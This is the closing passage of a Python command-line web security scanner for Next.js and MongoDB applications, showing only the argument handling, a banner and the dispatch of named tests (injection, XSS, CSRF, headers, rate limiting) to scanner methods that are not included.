    )
    
    args = parser.parse_args()
    
    # Banner
    print(f"{Fore.CYAN}")
    print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║                                                                ║
    ║         ENHANCED SECURITY TESTING TOOL v2.0                    ║
    ║         Next.js + MongoDB Web Application Scanner              ║
    ║                                                                ║
    ╚════════════════════════════════════════════════════════════════╝
    """)
    print(f"{Style.RESET_ALL}")
    
    # Validazione URL
    if not args.url.startswith(('http://', 'https://')):
        print(f"{Fore.RED}[ERROR] URL must start with http:// or https://")
        return
    
    tester = SecurityTester(args.url, verbose=args.verbose)
    
    print(f"{Fore.BLUE}[i] Target: {args.url}")
    print(f"{Fore.BLUE}[i] Verbose: {args.verbose}")
    print(f"{Fore.BLUE}[i] Starting comprehensive security tests...\n")
    
    # Determina quali test eseguire
    if args.all:
        tests = [
            'mongodb',
            'xss',
            'auth',
            'csrf',
            'https',
            'headers',
            'info',
            'input',
            'api',
            'rate-limit'
        ]
    elif args.test:
        tests = [t.strip() for t in args.test.split(',')]
    else:
        print(f"{Fore.YELLOW}No tests specified. Use --all or --test <test_names>")
        print(f"{Fore.YELLOW}Available tests: mongodb, xss, auth, csrf, https, headers, info, input, api, rate-limit")
        return
    
    # Mappa test
    test_map = {
        'mongodb': tester.test_mongodb_injection,
        'xss': tester.test_xss_advanced,
        'auth': tester.test_authentication_advanced,
        'csrf': tester.test_csrf_advanced,
        'https': tester.test_https_security,
        'headers': tester.test_security_headers_advanced,
        'info': tester.test_information_disclosure_advanced,
        'input': tester.test_input_validation_advanced,
        'api': tester.test_api_security,
        'rate-limit': tester.test_rate_limiting_advanced,
    }
    
    # Esegui test
    for test_name in tests:
        if test_name in test_map:
            try:
                test_map[test_name]()
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Tests interrupted by user")
                break
            except Exception as e:
                print(f"{Fore.RED}[!] Test '{test_name}' failed with error: {str(e)}")
                if args.verbose:
                    import traceback
                    traceback.print_exc()
        else:
            print(f"{Fore.YELLOW}[!] Unknown test: {test_name}")
            print(f"{Fore.YELLOW}    Available: {', '.join(test_map.keys())}")
    
    # Stampa riepilogo
    tester.print_summary()
    
    # Genera report se richiesto
    if args.report:
        print(f"\n{Fore.CYAN}[i] Generating security report...")
        tester.generate_report(args.output)

if __name__ == '__main__':
    main()
